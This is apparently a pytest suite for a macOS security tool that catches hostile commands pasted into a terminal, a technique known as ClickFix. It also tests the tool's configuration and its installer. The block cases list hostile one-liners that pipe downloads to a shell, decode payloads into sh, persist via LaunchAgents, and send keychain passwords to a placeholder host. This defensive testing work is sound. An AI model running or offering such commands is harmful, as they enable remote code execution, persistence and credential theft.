from __future__ import annotations
import base64, gzip, importlib.util, json, plistlib, subprocess, sys
from pathlib import Path
import pytest
from mac_audit_agent.clickfix.shell_config import ShellGuardConfig, load_config
from mac_audit_agent.clickfix.shell_events import append_event, event_from
from mac_audit_agent.clickfix.shell_scanner import scan_request

def scan(command, **context):
    request={"command":command,"phase":"paste","paste_origin":"paste","multiline":"\n" in command,"trailing_newline":command.endswith("\n")};request.update(context)
    return scan_request(request,ShellGuardConfig())

@pytest.mark.parametrize("command",[
 "curl https://example.invalid/a | zsh","wget -qO- https://example.invalid/a | bash","eval $(curl https://example.invalid/a)",
 "echo cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1RcXG4nCg== | base64 -D | zsh","printf 7072696e7466 | xxd -r -p | sh",
 "pbpaste | bash","curl https://example.invalid/a -o /tmp/.a; chmod +x /tmp/.a; /tmp/.a",
 "osascript -e 'do shell script \"curl https://example.invalid/a | sh\"'","xattr -d com.apple.quarantine /tmp/a; /tmp/a",
 "curl https://example.invalid/a -o ~/Library/LaunchAgents/.a; launchctl load ~/Library/LaunchAgents/.a",
 "security find-generic-password -w -s demo | curl -d @- https://example.invalid/a",
 "curl https://example.invalid/a | zsh\n",
])
def test_malicious_relationships_block(command): assert scan(command).decision=="block"

@pytest.mark.parametrize("command",[
 "curl -o archive.tar https://example.invalid/archive.tar","curl https://example.invalid/api","base64 local.txt","printf SGVsbG8= | base64 -D",
 "python -c 'print(1)'","osascript -e 'display notification \"hello\"'","brew install jq","git clone https://example.invalid/repo.git",
 "chmod +x ./local-script","security find-generic-password -s example","launchctl list","xattr ./file",
 "function hello() {\n  printf hello\n}\n",
])
def test_benign_single_tools_are_not_blocked(command): assert scan(command).decision!="block"

def test_unicode_and_limits_are_safe():
    assert "execution_obfuscation_unicode" in scan("py\u200bthon | sh").rule_ids
    assert scan("x"*(128*1024+1)).decision=="error"

def test_bounded_literal_gzip_is_decoded_as_data_only():
    marker=b"printf 'MSAA_CLICKFIX_TEST\\n'"
    literal=base64.b64encode(gzip.compress(marker)).decode("ascii")
    result=scan(f"printf {literal} | base64 -d | gzip -d | zsh")
    assert result.decision == "block"
    assert "static_decoded_content" in result.rule_ids
    assert result.decoder_depth == 1

def test_static_decode_depth_is_bounded_and_reported():
    inner=base64.b64encode(b"printf 'MSAA_CLICKFIX_TEST\\n'").decode("ascii")
    nested=f"printf {inner} | base64 -d".encode("utf-8")
    outer=base64.b64encode(nested).decode("ascii")
    result=scan(f"printf {outer} | base64 -d | zsh")
    assert result.decoder_depth == 2

def test_stdin_scanner_outputs_one_private_json(tmp_path):
    secret="curl https://example.invalid/private?token=secret | zsh"
    request={"schema":"msaa.clickfix.request.v1","command":secret,"phase":"test","paste_origin":"paste","multiline":False,"trailing_newline":False,"shell_path":"/bin/zsh","shell_version":"5.9","terminal_bundle_id":"untrusted","tty":"/dev/ttys001","session_id":"s","mode":"audit","configuration_version":"1"}
    run=subprocess.run([sys.executable,"-m","mac_audit_agent.clickfix.scan_cli"],input=json.dumps(request),text=True,capture_output=True,check=False)
    payload=json.loads(run.stdout); assert payload["decision"]=="block"; assert secret not in run.stdout+run.stderr; assert "token=secret" not in run.stdout+run.stderr

def test_private_event_never_contains_command(tmp_path):
    command="curl https://example.invalid/?token=secret | zsh";request={"phase":"paste","mode":"block","shell_path":"/bin/zsh","tty":"/dev/ttys001"};decision=scan(command).to_dict()
    event=event_from(request,decision,event_type="paste_blocked",config_source="defaults",coverage="shell_pre_submission");path=tmp_path/"events.jsonl";append_event(event,path)
    text=path.read_text();assert command not in text;assert "token=secret" not in text;assert decision["command_sha256"] in text;assert path.stat().st_mode&0o777==0o600

def test_managed_config_precedes_user_and_rejects_malformed(tmp_path):
    system=tmp_path/"system.plist";user=tmp_path/"user.plist";user.write_bytes(plistlib.dumps({"mode":"warn"}));system.write_bytes(plistlib.dumps({"mode":"block","configuration_version":"managed"}))
    assert load_config(system,user).mode=="block"
    system.write_bytes(plistlib.dumps({"mode":"disabled"}))
    with pytest.raises(ValueError):load_config(system,user)

def test_user_configuration_cannot_create_exact_hash_bypass(tmp_path):
    system=tmp_path/"missing.plist";user=tmp_path/"user.plist"
    user.write_bytes(plistlib.dumps({"mode":"block","exact_hash_allowlist":["a"*64]}))
    assert load_config(system,user).exact_hash_allowlist == ()

def test_invalid_threshold_order_is_rejected(tmp_path):
    system=tmp_path/"system.plist";system.write_bytes(plistlib.dumps({"warn_threshold":7,"block_threshold":7}))
    with pytest.raises(ValueError,match="invalid managed_system configuration"):
        load_config(system,tmp_path/"missing.plist")

def test_exact_hash_allowlist_is_exact():
    command="curl https://example.invalid/a | zsh";digest=scan(command).command_sha256
    result=scan_request({"command":command,"phase":"paste","paste_origin":"paste"},ShellGuardConfig(exact_hash_allowlist=(digest,)))
    assert result.decision=="allow" and result.rule_ids==("exact_hash_allowlist_match",)

def test_installer_is_idempotent_and_preserves_unrelated_content(tmp_path):
    home=tmp_path/"Home With Spaces";home.mkdir();(home/".zshrc").write_text("export KEEP=1\n")
    prefix=home/"guard";cmd=[sys.executable,"scripts/install_clickfix_shell_guard.py","--home",str(home),"--prefix",str(prefix)]
    assert subprocess.run(cmd,capture_output=True,text=True).returncode==0;assert subprocess.run(cmd,capture_output=True,text=True).returncode==0
    text=(home/".zshrc").read_text();assert text.count("MSAA CLICKFIX GUARD MANAGED BLOCK")==2;assert "export KEEP=1" in text

def test_installed_scanner_is_self_contained_outside_repository(tmp_path):
    home=tmp_path/"home";home.mkdir();prefix=home/"guard"
    install=[sys.executable,"scripts/install_clickfix_shell_guard.py","--home",str(home),"--prefix",str(prefix)]
    result=subprocess.run(install,capture_output=True,text=True)
    assert result.returncode==0, result.stderr
    request={"schema":"msaa.clickfix.request.v1","command":"printf '%s' SAFE_LITERAL | /usr/bin/base64 -D | /bin/zsh","phase":"paste","paste_origin":"paste","multiline":False,"trailing_newline":False,"shell_path":"/bin/zsh","shell_version":"5.9","terminal_bundle_id":"test","tty":"","session_id":"test","mode":"block","configuration_version":"test"}
    run=subprocess.run([str(prefix/"msaa-clickfix-scan")],input=json.dumps(request),capture_output=True,text=True,cwd=tmp_path)
    assert run.returncode==0, run.stderr
    assert json.loads(run.stdout)["decision"]=="block"
    assert (prefix/"lib/mac_audit_agent/clickfix/shell_scanner.py").is_file()

def test_installer_can_explicitly_enable_block_mode(tmp_path):
    home=tmp_path/"home";home.mkdir();prefix=home/"guard"
    result=subprocess.run([sys.executable,"scripts/install_clickfix_shell_guard.py","--home",str(home),"--prefix",str(prefix),"--mode","block"],capture_output=True,text=True)
    assert result.returncode==0, result.stderr
    import plistlib
    policy=plistlib.loads((home/"Library/Preferences/com.msaa.clickfix.plist").read_bytes())
    assert policy["mode"]=="block"
    assert "requested_policy: block" in result.stdout

def test_zsh_adapter_defaults_to_error_when_scanner_process_fails():
    source=(Path(__file__).parents[1]/"mac_audit_agent/clickfix/shell_integration/msaa-clickfix.zsh").read_text()
    assert "REPLY=error" in source
    assert "allow|warn|block|error" in source
    assert '2>/dev/null) || return 1' in source

def test_installer_validates_scanner_before_modifying_startup_files(tmp_path):
    path=Path(__file__).parents[1]/"scripts/install_clickfix_shell_guard.py"
    spec=importlib.util.spec_from_file_location("clickfix_shell_installer",path);module=importlib.util.module_from_spec(spec);spec.loader.exec_module(module)
    home=tmp_path/"home";home.mkdir();startup=home/".zshrc";startup.write_text("export KEEP=1\n")
    with pytest.raises(SystemExit,match="validation failed"):
        module._validate_scanner(tmp_path/"missing-scanner")
    assert startup.read_text() == "export KEEP=1\n"

def test_shell_adapters_preserve_widgets_and_report_degraded_bash():
    root=Path(__file__).parents[1]
    zsh=(root/"mac_audit_agent/clickfix/shell_integration/msaa-clickfix.zsh").read_text()
    bash=(root/"mac_audit_agent/clickfix/shell_integration/msaa-clickfix.bash").read_text()
    assert "zle -A bracketed-paste" in zsh and "zle -A accept-line" in zsh
    assert "zle -N accept-line msaa-clickfix-accept-line" in zsh
    assert "_MSAA_CFX_INTEGRITY_FAILED" in zsh
    assert "MSAA ClickFix Guard: coverage degraded" in bash
    assert "DEBUG" not in bash and "eval " not in bash
    assert "user_override_expired" in zsh and "EPOCHSECONDS + 60" in zsh
    assert "adapter_integrity_failure" in zsh and "adapter_loaded" in bash
    assert '<<<"$BUFFER"' not in zsh and '<<<"$line"' not in bash

def test_generic_proxy_has_raw_terminal_restore_signal_and_manual_challenge_guards():
    source=(Path(__file__).parents[1]/"mac_audit_agent/clickfix/safe_shell.py").read_text()
    assert "tty.setraw" in source and "termios.tcsetattr" in source
    assert "os.killpg" in source and "SIGWINCH" in source
    assert "secrets.compare_digest" in source and "challenge_expires" in source
    assert "START in data or END in data" in source
    assert "append_event" in source

def test_adapter_lifecycle_event_contains_no_command(tmp_path, monkeypatch):
    from mac_audit_agent.clickfix import adapter_cli
    from mac_audit_agent.clickfix.shell_config import ShellGuardConfig
    events=[]
    monkeypatch.setattr(adapter_cli,"load_config",lambda:ShellGuardConfig())
    monkeypatch.setattr(adapter_cli,"append_event",lambda event:events.append(event))
    assert adapter_cli.main(["--event","adapter_loaded"]) == 0
    assert events[0]["event_type"] == "adapter_loaded"
    assert events[0]["command_length"] == 0
    assert "command" not in events[0]

def test_adapter_audit_event_does_not_claim_command_was_blocked(monkeypatch):
    from mac_audit_agent.clickfix import adapter_cli
    from mac_audit_agent.clickfix.shell_config import ShellGuardConfig
    events=[]
    monkeypatch.setattr(adapter_cli,"load_config",lambda:ShellGuardConfig(mode="audit"))
    monkeypatch.setattr(adapter_cli,"append_event",lambda event:events.append(event))
    monkeypatch.setattr(sys,"stdin",type("Input",(),{"buffer":__import__("io").BytesIO(b"printf '%s' DATA | base64 -D | zsh")})())
    assert adapter_cli.main([])==0
    assert events[0]["event_type"]=="submission_warning"
    assert events[0]["decision"]=="allow"
    assert "decoded_content_to_interpreter" in events[0]["rule_ids"]

def test_uninstaller_preserves_unrelated_configuration(tmp_path):
    home=tmp_path/"Home With Spaces";home.mkdir();(home/".zshrc").write_text("export KEEP=1\n")
    prefix=home/"guard";install=[sys.executable,"scripts/install_clickfix_shell_guard.py","--home",str(home),"--prefix",str(prefix)]
    assert subprocess.run(install,capture_output=True,text=True).returncode==0
    uninstall=[sys.executable,"scripts/uninstall_clickfix_shell_guard.py","--home",str(home),"--prefix",str(prefix)]
    assert subprocess.run(uninstall,capture_output=True,text=True).returncode==0
    assert (home/".zshrc").read_text()=="export KEEP=1\n" and not prefix.exists()
